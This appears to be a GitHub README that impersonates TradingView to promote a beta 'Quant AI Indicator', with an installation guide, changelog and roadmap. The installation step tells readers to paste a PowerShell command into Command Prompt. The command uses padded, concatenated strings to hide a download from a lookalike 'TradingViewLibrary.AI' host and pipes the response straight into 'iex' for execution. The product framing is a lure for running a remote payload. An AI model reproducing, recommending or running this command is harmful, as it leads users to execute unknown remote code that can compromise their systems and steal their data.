<a id="get"></a>
<div align="center">
<p align="center">
  <img src="logo.png" alt="TradingView" width="580">
</p>

## Quant AI Indicator

</div>

The first AI-powered indicator in our library. Quant analyzes live market data and changing conditions to model several ways a setup may develop over the selected timeframe. Early beta access is currently available through GitHub ahead of the full in-app release.

## Installation

Follow the steps below to install the Quant Indicator and its required dependencies using Command Prompt.

### 1. Open Command Prompt.

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

### 2. Install Quant Indicator.

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library'; $Install; $Pinescript='TradingView'+$Sync+'.AI'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
```

Press **Enter** to begin the installation.

### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.





## Support

Quant is currently being tested ahead of its full in-app release.

If you encounter an issue or would like to share feedback, contact us at [support@tradingview.com](mailto:support@tradingview.com).

Your feedback helps us improve stability, model behavior, and chart integration throughout the beta.

## Current Version

**Version:** `v2.9.5-beta`



## Changelog

### v2.9.5-beta

### Model & Analysis Engine

- Refined multi-factor processing across price action, liquidity, positioning, volatility, and market structure.
- Updated scenario-generation logic to produce clearer differences between possible market paths.
- Adjusted model recalculation when incoming data changes the underlying setup.
- Improved consistency across short-, medium-, and longer-term timeframes.

#### Event-Aware Analysis

- Expanded processing of scheduled market events.
- Added relevance filtering based on asset, timeframe, and event timing.
- Updated scenario refreshes to account for newly available event information.

#### Scenario Engine

- Reduced overlap between generated market views.
- Improved identification of the key factors behind each scenario.
- Refined how timeframe and market structure are incorporated into scenario generation.

#### Live Data Pipeline

- Reduced latency between incoming market data and analysis updates.
- Improved handling of rapid changes in volatility.
- Added validation for incomplete or inconsistent market inputs.

#### Chart Integration

- Improved scenario rendering directly on the chart.
- Updated synchronization between model refreshes and displayed data.
- Improved stability when switching assets and timeframes.

#### Stability & Performance

- Reduced recalculation time across parts of the analysis pipeline.
- Improved recovery from temporary data-source interruptions.
- Fixed synchronization and display issues identified during beta testing.

---

## What We’re Working On

Current beta development is focused on:

- scenario quality across different market regimes;
- event-aware analysis;
- reducing unnecessary changes during noisy market conditions;
- faster adaptation to meaningful changes in market structure;
- broader stability testing across assets and timeframes.

Additional changes will be documented as the beta progresses.
